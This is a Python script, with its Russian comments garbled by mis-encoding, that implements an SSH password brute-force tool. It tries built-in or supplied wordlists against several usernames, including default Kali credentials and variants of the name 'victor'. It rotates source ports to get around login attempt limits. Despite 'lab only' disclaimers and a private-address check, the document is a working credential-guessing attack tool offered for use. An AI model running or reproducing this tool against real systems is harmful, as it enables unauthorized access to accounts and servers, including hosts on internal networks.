#!/usr/bin/env python3
"""
–£–º–Ω—ã–π SSH Brute Force —Å —Ä–æ—Ç–∞—Ü–∏–µ–π –ø–æ—Ä—Ç–æ–≤ –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
–í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Å—Ä–µ–¥–µ!

–ê–≤—Ç–æ—Ä: –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –º–∞—Ç–µ—Ä–∏–∞–ª –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
–õ–∏—Ü–µ–Ω–∑–∏—è: –¢–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π
"""

import paramiko
import sys
import time
import threading
import argparse
import socket
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

class SmartSSHBruteforce:
    """
    –£–º–Ω—ã–π SSH Brute Force —Å —Ä–æ—Ç–∞—Ü–∏–µ–π –ø–æ—Ä—Ç–æ–≤ –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
    """
    
    def __init__(self, target_ip, target_port=22):
        self.target_ip = target_ip
        self.target_port = target_port
        self.found_credentials = []
        self.attempts = 0
        self.timeout = 10
        self.delay_between_attempts = 0.5
        self.attempts_per_port = 10  # –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ –Ω–∞ –æ–¥–∏–Ω –ø–æ—Ä—Ç
        self.port_rotation_delay = 0.5  # –ó–∞–¥–µ—Ä–∂–∫–∞ –ø—Ä–∏ —Å–º–µ–Ω–µ –ø–æ—Ä—Ç–∞
        self.source_ports = []
        self.current_port_index = 0
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
        if not self._is_safe_target(target_ip):
            print("‚ùå –û–®–ò–ë–ö–ê: SSH –∞—Ç–∞–∫–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω—ã —Ç–æ–ª—å–∫–æ –¥–ª—è –ª–æ–∫–∞–ª—å–Ω—ã—Ö —Å–µ—Ç–µ–π!")
            sys.exit(1)
    
    def _is_safe_target(self, ip):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Ü–µ–ª–∏"""
        safe_prefixes = ['127.', '192.168.', '10.']
        
        if ip.startswith('172.'):
            try:
                second_octet = int(ip.split('.')[1])
                return 16 <= second_octet <= 31
            except:
                return False
        
        return any(ip.startswith(prefix) for prefix in safe_prefixes)
    
    def generate_source_ports(self, count=100):
        """
        –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω—ã—Ö –ø–æ—Ä—Ç–æ–≤ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        """
        min_port = 1024
        max_port = 65535
        
        ports = []
        for _ in range(count):
            port = random.randint(min_port, max_port)
            if port not in ports:
                ports.append(port)
        
        self.source_ports = ports
        print(f"‚úÖ –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–æ {len(ports)} –ø–æ—Ä—Ç–æ–≤ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è")
        return ports
    
    def get_next_source_port(self):
        """
        –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ª–µ–¥—É—é—â–µ–≥–æ –ø–æ—Ä—Ç–∞ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        """
        if not self.source_ports:
            self.generate_source_ports()
        
        port = self.source_ports[self.current_port_index % len(self.source_ports)]
        self.current_port_index += 1
        
        # –ï—Å–ª–∏ –∏—Å—á–µ—Ä–ø–∞–ª–∏ –≤—Å–µ –ø–æ—Ä—Ç—ã, –≥–µ–Ω–µ—Ä–∏—Ä—É–µ–º –Ω–æ–≤—ã–µ
        if self.current_port_index >= len(self.source_ports):
            print("üîÑ –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –Ω–æ–≤—ã–µ –ø–æ—Ä—Ç—ã...")
            self.generate_source_ports()
            self.current_port_index = 0
        
        return port
    
    def test_ssh_connection(self, username, password, source_port=None):
        """
        –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SSH —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å –∑–∞–¥–∞–Ω–Ω—ã–º–∏ —É—á–µ—Ç–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏
        """
        try:
            # –°–æ–∑–¥–∞–µ–º SSH –∫–ª–∏–µ–Ω—Ç
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if source_port:
                # –ü—ã—Ç–∞–µ–º—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∏—Å—Ç–æ—á–Ω–∏–∫ –ø–æ—Ä—Ç (–º–æ–∂–µ—Ç –Ω–µ —Ä–∞–±–æ—Ç–∞—Ç—å –Ω–∞ –≤—Å–µ—Ö —Å–∏—Å—Ç–µ–º–∞—Ö)
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    sock.bind(('', source_port))
                    
                    ssh.connect(
                        self.target_ip,
                        port=self.target_port,
                        username=username,
                        password=password,
                        timeout=self.timeout,
                        allow_agent=False,
                        look_for_keys=False,
                        sock=sock
                    )
                    sock.close()
                except (OSError, socket.error):
                    # –ï—Å–ª–∏ –Ω–µ —É–¥–∞–µ—Ç—Å—è –ø—Ä–∏–≤—è–∑–∞—Ç—å –∫ –ø–æ—Ä—Ç—É, –∏—Å–ø–æ–ª—å–∑—É–µ–º –æ–±—ã—á–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
                    ssh.connect(
                        self.target_ip,
                        port=self.target_port,
                        username=username,
                        password=password,
                        timeout=self.timeout,
                        allow_agent=False,
                        look_for_keys=False
                    )
            else:
                # –û–±—ã—á–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
                ssh.connect(
                    self.target_ip,
                    port=self.target_port,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
            
            # –ï—Å–ª–∏ –¥–æ—à–ª–∏ —Å—é–¥–∞, –∑–Ω–∞—á–∏—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ
            ssh.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            if "Authentication failed" in str(e) or "No existing session" in str(e):
                return False
            else:
                return False
        except Exception as e:
            return False
    
    def brute_force_with_port_rotation(self, usernames, password_list):
        """
        –£–º–Ω–∞—è brute force –∞—Ç–∞–∫–∞ —Å —Ä–æ—Ç–∞—Ü–∏–µ–π –ø–æ—Ä—Ç–æ–≤ –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
        """
        print(f"üß† –£–º–Ω–∞—è SSH Brute Force –∞—Ç–∞–∫–∞ –Ω–∞ {self.target_ip}:{self.target_port}")
        print(f"üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏: {', '.join(usernames)}")
        print(f"üìÅ –°–ª–æ–≤–∞—Ä—å –ø–∞—Ä–æ–ª–µ–π: {len(password_list)} –ø–∞—Ä–æ–ª–µ–π")
        print(f"üîÑ –ü–æ–ø—ã—Ç–æ–∫ –Ω–∞ –ø–æ—Ä—Ç: {self.attempts_per_port}")
        print(f"‚è≥ –ó–∞–¥–µ—Ä–∂–∫–∞ –ø—Ä–∏ —Å–º–µ–Ω–µ –ø–æ—Ä—Ç–∞: {self.port_rotation_delay} —Å–µ–∫")
        print(f"‚è±Ô∏è  Timeout: {self.timeout} —Å–µ–∫—É–Ω–¥")
        
        start_time = time.time()
        cycle_count = 0
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å SSH
        print("\nüîç –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å SSH...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result != 0:
                print("‚ùå SSH –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É 22")
                return False
            else:
                print("‚úÖ SSH –¥–æ—Å—Ç—É–ø–µ–Ω")
        except Exception as e:
            print(f"‚ö†Ô∏è  –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ SSH: {e}")
        
        print(f"\nüöÄ –ù–∞—á–∏–Ω–∞–µ–º —É–º–Ω—É—é brute force –∞—Ç–∞–∫—É...")
        print("üí° –ù–∞–∂–º–∏—Ç–µ Ctrl+C –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏")
        
        try:
            while True:
                cycle_count += 1
                print(f"\nüîÑ –¶–∏–∫–ª {cycle_count}: –ê—Ç–∞–∫—É–µ–º {len(usernames)} –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π...")
                
                # –î–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                for username in usernames:
                    print(f"\nüë§ –ê—Ç–∞–∫—É–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {username}")
                    
                    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –Ω–æ–≤—ã–π –ø–æ—Ä—Ç –¥–ª—è —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                    current_source_port = self.get_next_source_port()
                    print(f"üîÄ –ò—Å–ø–æ–ª—å–∑—É–µ–º –ø–æ—Ä—Ç: {current_source_port}")
                    
                    # –ü–µ—Ä–µ–±–∏—Ä–∞–µ–º –ø–∞—Ä–æ–ª–∏ —Å –ª–∏–º–∏—Ç–æ–º –ø–æ–ø—ã—Ç–æ–∫ –Ω–∞ –ø–æ—Ä—Ç
                    attempts_on_current_port = 0
                    
                    for password in password_list:
                        if attempts_on_current_port >= self.attempts_per_port:
                            print(f"‚è∏Ô∏è  –î–æ—Å—Ç–∏–≥–Ω—É—Ç –ª–∏–º–∏—Ç –ø–æ–ø—ã—Ç–æ–∫ ({self.attempts_per_port}) –¥–ª—è –ø–æ—Ä—Ç–∞ {current_source_port}")
                            print(f"‚è≥ –ü–∞—É–∑–∞ {self.port_rotation_delay} —Å–µ–∫ –ø–µ—Ä–µ–¥ —Å–º–µ–Ω–æ–π –ø–æ—Ä—Ç–∞...")
                            time.sleep(self.port_rotation_delay)
                            
                            # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –Ω–æ–≤—ã–π –ø–æ—Ä—Ç
                            current_source_port = self.get_next_source_port()
                            print(f"üîÄ –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º—Å—è –Ω–∞ –ø–æ—Ä—Ç: {current_source_port}")
                            attempts_on_current_port = 0
                        
                        self.attempts += 1
                        attempts_on_current_port += 1
                        
                        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –∫–∞–∂–¥—ã–µ 5 –ø–æ–ø—ã—Ç–æ–∫
                        if self.attempts % 5 == 0:
                            elapsed_time = time.time() - start_time
                            speed = self.attempts / elapsed_time if elapsed_time > 0 else 0
                            print(f"üìä –ü–æ–ø—ã—Ç–∫–∞ {self.attempts}: {username}:{password} | –ü–æ—Ä—Ç: {current_source_port} | –°–∫–æ—Ä–æ—Å—Ç—å: {speed:.2f} –ø–æ–ø—ã—Ç–æ–∫/—Å–µ–∫")
                        
                        # –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è
                        if self.test_ssh_connection(username, password, current_source_port):
                            print(f"üéâ –£–°–ü–ï–•! –ù–∞–π–¥–µ–Ω –ø–∞—Ä–æ–ª—å: {username}:{password}")
                            self.found_credentials.append((username, password))
                            return True
                        
                        # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏
                        time.sleep(self.delay_between_attempts)
                
                print(f"‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω —Ü–∏–∫–ª {cycle_count} –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π. –ù–∞—á–∏–Ω–∞–µ–º –Ω–æ–≤—ã–π —Ü–∏–∫–ª...")
                time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\nüõë –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
            return False
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
            return False
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\nüìä –†–µ–∑—É–ª—å—Ç–∞—Ç—ã brute force:")
        print(f"  ‚Ä¢ –í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {duration:.2f} —Å–µ–∫—É–Ω–¥")
        print(f"  ‚Ä¢ –í—Å–µ–≥–æ –ø–æ–ø—ã—Ç–æ–∫: {self.attempts}")
        print(f"  ‚Ä¢ –ó–∞–≤–µ—Ä—à–µ–Ω–æ —Ü–∏–∫–ª–æ–≤: {cycle_count}")
        print(f"  ‚Ä¢ –°–∫–æ—Ä–æ—Å—Ç—å: {self.attempts/duration:.2f} –ø–æ–ø—ã—Ç–æ–∫/—Å–µ–∫")
        
        if self.found_credentials:
            print(f"  ‚Ä¢ –ù–∞–π–¥–µ–Ω–æ —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π: {len(self.found_credentials)}")
            for username, password in self.found_credentials:
                print(f"    üéâ {username}:{password}")
            return True
        else:
            print(f"  ‚Ä¢ –†–µ–∑—É–ª—å—Ç–∞—Ç: –ü–∞—Ä–æ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
            return False
    
    def load_password_list(self, filename):
        """
        –ó–∞–≥—Ä—É–∑–∫–∞ —Å–ø–∏—Å–∫–∞ –ø–∞—Ä–æ–ª–µ–π –∏–∑ —Ñ–∞–π–ª–∞
        """
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"‚úÖ –ó–∞–≥—Ä—É–∂–µ–Ω–æ {len(passwords)} –ø–∞—Ä–æ–ª–µ–π –∏–∑ {filename}")
            return passwords
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞ –ø–∞—Ä–æ–ª–µ–π: {e}")
            return []
    
    def load_github_passwords(self):
        """
        –ó–∞–≥—Ä—É–∑–∫–∞ –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π –∏–∑ GitHub
        """
        passwords = [
            # Kali Linux —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –ø–∞—Ä–æ–ª–∏
            'kali', 'toor', 'kali123', 'toor123', 'kali2024', 'kali2023',
            'kalilinux', 'kalilinux123', 'kalilinux2024',
            'root', 'root123', 'root2024', 'root2023',
            'admin', 'admin123', 'admin2024', 'admin2023',
            
            # Victor —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –ø–∞—Ä–æ–ª–∏
            'victor', 'victor123', 'victor2024', 'victor2023',
            'Victor', 'Victor123', 'Victor2024', 'Victor2023',
            'VICTOR', 'VICTOR123', 'VICTOR2024', 'VICTOR2023',
            
            # –ü–æ–ø—É–ª—è—Ä–Ω—ã–µ –ø–∞—Ä–æ–ª–∏
            'password', '123456', 'admin', 'root', 'user', 'test', 'hello',
            'password123', 'admin123', 'root123', 'user123',
            'password1', 'admin1', 'root1', 'user1',
            'password!', 'admin!', 'root!', 'user!',
            'password@', 'admin@', 'root@', 'user@',
            'password#', 'admin#', 'root#', 'user#',
            
            # –ü—Ä–æ—Å—Ç—ã–µ –ø–∞—Ä–æ–ª–∏
            '123', '1234', '12345', '123456', '1234567',
            'pass', 'Pass', 'PASS', 'pass123', 'Pass123', 'PASS123',
            'test', 'Test', 'TEST', 'test123', 'Test123', 'TEST123',
            'user', 'User', 'USER', 'user123', 'User123', 'USER123',
            
            # –ü—É—Å—Ç—ã–µ –∏ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ
            '', '1', '12', '123', '1234', '12345',
            'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
            'q', 'qq', 'qqq', 'qqqq', 'qqqqq',
            'z', 'zz', 'zzz', 'zzzz', 'zzzzz'
        ]
        
        print(f"‚úÖ –ó–∞–≥—Ä—É–∂–µ–Ω–æ {len(passwords)} –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π")
        return passwords

def main():
    """
    –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —É–º–Ω–æ–≥–æ SSH –∞—Ç–∞–∫—É—é—â–µ–≥–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
    """
    print("=" * 60)
    print("üß† –£–ú–ù–´–ô SSH –ê–¢–ê–ö–£–Æ–©–ò–ô –ò–ù–°–¢–†–£–ú–ï–ù–¢")
    print("=" * 60)
    print("‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏–∏!")
    print("‚ö†Ô∏è  –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—Ä–æ—Ç–∏–≤ —á—É–∂–∏—Ö —Å–∏—Å—Ç–µ–º –ù–ï–ó–ê–ö–û–ù–ù–û!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='–£–º–Ω—ã–π SSH –∞—Ç–∞–∫—É—é—â–∏–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç')
    parser.add_argument('target', help='IP –∞–¥—Ä–µ—Å —Ü–µ–ª–∏')
    parser.add_argument('-u', '--usernames', default='root,kali,victor,admin', help='–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –¥–ª—è –∞—Ç–∞–∫–∏ (—á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é)')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH –ø–æ—Ä—Ç')
    parser.add_argument('-w', '--wordlist', help='–§–∞–π–ª —Å–æ —Å–ª–æ–≤–∞—Ä–µ–º –ø–∞—Ä–æ–ª–µ–π')
    parser.add_argument('--attempts-per-port', type=int, default=10, help='–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ –Ω–∞ –æ–¥–∏–Ω –ø–æ—Ä—Ç')
    parser.add_argument('--port-rotation-delay', type=float, default=0.5, help='–ó–∞–¥–µ—Ä–∂–∫–∞ –ø—Ä–∏ —Å–º–µ–Ω–µ –ø–æ—Ä—Ç–∞')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout –¥–ª—è SSH —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è')
    parser.add_argument('--delay', type=float, default=0.5, help='–ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏')
    parser.add_argument('--github-passwords', action='store_true', help='–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–æ–ø—É–ª—è—Ä–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ –∏–∑ GitHub')
    parser.add_argument('--port-count', type=int, default=100, help='–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ä—Ç–æ–≤ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏')
    
    args = parser.parse_args()
    
    # –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
    ssh_attack = SmartSSHBruteforce(args.target, args.port)
    ssh_attack.timeout = args.timeout
    ssh_attack.delay_between_attempts = args.delay
    ssh_attack.attempts_per_port = args.attempts_per_port
    ssh_attack.port_rotation_delay = args.port_rotation_delay
    
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –ø–æ—Ä—Ç—ã
    ssh_attack.generate_source_ports(args.port_count)
    
    # –ó–∞–≥—Ä—É–∂–∞–µ–º –ø–∞—Ä–æ–ª–∏
    if args.github_passwords:
        passwords = ssh_attack.load_github_passwords()
    elif args.wordlist:
        passwords = ssh_attack.load_password_list(args.wordlist)
    else:
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫
        passwords = [
            'victor', 'Victor', 'VICTOR', 'victor123', 'Victor123', 'VICTOR123',
            'victor1', 'Victor1', 'VICTOR1', 'victor1234', 'Victor1234', 'VICTOR1234',
            'victor!', 'Victor!', 'VICTOR!', 'victor@', 'Victor@', 'VICTOR@',
            'password', '123456', 'admin', 'root', 'kali', 'test', 'hello',
            'password123', 'admin123', 'root123', 'kali123', 'toor', 'toor123'
        ]
    
    if not passwords:
        print("‚ùå –ù–µ—Ç –ø–∞—Ä–æ–ª–µ–π –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è")
        return
    
    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è –∞—Ç–∞–∫–∏
    usernames = [u.strip() for u in args.usernames.split(',')]
    
    try:
        # –ó–∞–ø—É—Å–∫–∞–µ–º —É–º–Ω—É—é brute force –∞—Ç–∞–∫—É
        success = ssh_attack.brute_force_with_port_rotation(usernames, passwords)
        
        if success:
            print("\nüéâ –ê–¢–ê–ö–ê –£–°–ü–ï–®–ù–ê!")
            print("üí° –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∑–∞—â–∏—Ç–µ:")
            print("  ‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Å–∏–ª—å–Ω—ã–µ –ø–∞—Ä–æ–ª–∏")
            print("  ‚Ä¢ –í–∫–ª—é—á–∏—Ç–µ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω—É—é –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é")
            print("  ‚Ä¢ –ù–∞—Å—Ç—Ä–æ–π—Ç–µ fail2ban –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ IP")
            print("  ‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ SSH –∫–ª—é—á–∏ –≤–º–µ—Å—Ç–æ –ø–∞—Ä–æ–ª–µ–π")
            print("  ‚Ä¢ –û–≥—Ä–∞–Ω–∏—á—å—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ –≤—Ö–æ–¥–∞")
        else:
            print("\n‚ùå –ê–¢–ê–ö–ê –ù–ï–£–°–ü–ï–®–ù–ê")
            print("‚úÖ –°–∏—Å—Ç–µ–º–∞ –∑–∞—â–∏—â–µ–Ω–∞ –æ—Ç brute force –∞—Ç–∞–∫")
            
    except KeyboardInterrupt:
        print("\nüõë –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
    
    print("\nüìö –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:")
    print("‚Ä¢ –£–º–Ω–∞—è SSH brute force —Å —Ä–æ—Ç–∞—Ü–∏–µ–π –ø–æ—Ä—Ç–æ–≤")
    print("‚Ä¢ –ê—Ç–∞–∫–∞ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ")
    print("‚Ä¢ –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø–æ–ø—ã—Ç–æ–∫ –Ω–∞ –ø–æ—Ä—Ç –¥–ª—è –æ–±—Ö–æ–¥–∞ –ª–∏–º–∏—Ç–æ–≤")
    print("‚Ä¢ –ó–∞—â–∏—Ç–∞: —Å–∏–ª—å–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ + fail2ban + 2FA")

if __name__ == "__main__":
    main()
